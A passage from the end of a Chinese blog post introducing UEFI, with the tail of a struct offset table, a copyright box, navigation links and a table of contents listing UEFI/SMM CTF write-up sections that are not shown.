<td>mCommunicateHeader.MessageLength</td>
<td>0x100</td>
</tr>
<tr>
<td>mCommunicateHeader.Data</td>
<td>0x108</td>
</tr>
</tbody>
</table>
</div>
<p>不知道是否会受版本影响,如果不同另外调试便是</p>
</article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>uefi初识</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://ixout.github.io/posts/36191/">https://ixout.github.io/posts/36191/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>ixout</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2024-04-06</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2024-04-18</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/uefi/">uefi</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/a96d6be2655648d9ab6dc8b314f2a8d1%20(1).jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/46596/" title="protobuf初识"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/8373377e69c3499d90.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">protobuf初识</div></div></a></div><div class="next-post pull-right"><a href="/posts/29003/" title="DirtyPageTable"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/back.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">DirtyPageTable</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-author"><div class="item-headline"><i class="fa-solid fa-circle-user"></i><span>Author</span></div><div class="author-main-content"><div class="author-check-content"><label class="author-info" for="author-info">     <input id="author-info" type="checkbox" name="author-info"/><div class="author-avatar"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-name">ixout</div></label></div><div class="author-switch-content"><input class="switch-content" type="radio" name="switch-content" value="description"/><label class="author-description-box">      <div class="author-description"><font color="#e66b6d">十八线业余选手</font></div></label><input class="switch-content" type="radio" name="switch-content" value="social" checked="checked"/><label class="author-social-box"><a class="card-author-button" target="_blank" rel="noopener" href="https://github.com/ixout"><i class="iconfont icon-github"></i><span>Follow Me With Github</span></a><div class="social-icons"><a class="social-icon" href="https://github.com/ixout" target="_blank" title="Github"><i class="fa-brands fa-github"></i></a><a class="social-icon" href="/1425430423" target="_blank" title="QQ"><i class="fa-brands fa-qq"></i></a></div></label><input class="switch-content" type="radio" name="switch-content" value="site-data"/><label class="author-data-box"><div class="site-data"><a class="data-item" href="/archives/"><div class="data-name">文章</div><div class="data-length">43</div></a><a class="data-item" href="/tags/"><div class="data-name">标签</div><div class="data-length">50</div></a><a class="data-item" href="/categories/"><div class="data-name">分类</div><div class="data-length">4</div></a></div></label></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>告示牌</span></div><div class="announcement_content"><font color="＃00CED1">(º﹃º)阿巴阿巴阿巴......</font></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#UEFI%E7%BB%84%E6%88%90"><span class="toc-number">1.1.</span> <span class="toc-text">UEFI组成</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMM"><span class="toc-number">1.2.</span> <span class="toc-text">SMM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UEFI%E4%B8%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">1.3.</span> <span class="toc-text">UEFI与操作系统的关系</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EDK2"><span class="toc-number">1.4.</span> <span class="toc-text">EDK2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#uictf2022-cowsay1"><span class="toc-number">2.1.</span> <span class="toc-text">uictf2022-cowsay1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%91%B8%E7%B4%A2"><span class="toc-number">2.1.1.</span> <span class="toc-text">摸索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81"><span class="toc-number">2.1.2.</span> <span class="toc-text">补丁</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EFI-System-Table"><span class="toc-number">2.1.3.</span> <span class="toc-text">EFI System Table</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95"><span class="toc-number">2.1.4.</span> <span class="toc-text">尝试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">2.1.5.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">2.1.6.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Step-1-get-LocateProtocol"><span class="toc-number">2.1.6.1.</span> <span class="toc-text">Step 1: get LocateProtocol</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Step-2-get-mSmmCommunication"><span class="toc-number">2.1.6.2.</span> <span class="toc-text">Step 2: get mSmmCommunication</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Step-3-getflag"><span class="toc-number">2.1.6.3.</span> <span class="toc-text">Step 3: getflag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#uictf2022-cowsay2"><span class="toc-number">2.2.</span> <span class="toc-text">uictf2022-cowsay2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">2.2.1.</span> <span class="toc-text">题目信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.2.</span> <span class="toc-text">漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">2.2.3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#step1"><span class="toc-number">2.2.3.1.</span> <span class="toc-text">step1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step-2"><span class="toc-number">2.2.3.2.</span> <span class="toc-text">step 2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#uictf2022-cowsay3"><span class="toc-number">2.3.</span> <span class="toc-text">uictf2022-cowsay3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gadget"><span class="toc-number">2.3.2.</span> <span class="toc-text">gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Putting-it-all-together"><span class="toc-number">2.3.3.</span> <span class="toc-text">Putting it all together</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Doubhe2024-ToySMM"><span class="toc-number">2.4.</span> <span class="toc-text">Doubhe2024-ToySMM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TOYSMM"><span class="toc-number">2.4.1.</span> <span class="toc-text">TOYSMM</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8B%BE%E9%81%97"><span class="toc-number">3.</span> <span class="toc-text">拾遗</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88"><span class="toc-number">3.1.</span> <span class="toc-text">函数调用栈</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#uefishell"><span class="toc-number">3.2.</span> <span class="toc-text">uefishell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GUID"><span class="toc-number">3.3.</span> <span class="toc-text">GUID</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8ESMM%E9%80%9A%E4%BF%A1"><span class="toc-number">3.4.</span> <span class="toc-text">与SMM通信</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D"><span class="toc-number">3.5.</span> <span class="toc-text">内存分配</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#debugon"><span class="toc-number">3.6.</span> <span class="toc-text">debugon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMRAM"><span class="toc-number">3.7.</span> <span class="toc-text">SMRAM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMI%E6%B5%81%E7%A8%8B"><span class="toc-number">3.8.</span> <span class="toc-text">SMI流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A8%E5%B1%80comm%E5%8F%98%E9%87%8F"><span class="toc-number">3.9.</span> <span class="toc-text">全局comm变量</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By ixout</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="/js/cursor.js"></script><script async src="/js/fps.js"></script><script async src="/js/title.js"></script><script src="/js/sun_moon.js" async></script><script async src="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="20px" data-random="false" async="async"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><!-- hexo injector body_end start --><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --></body></html>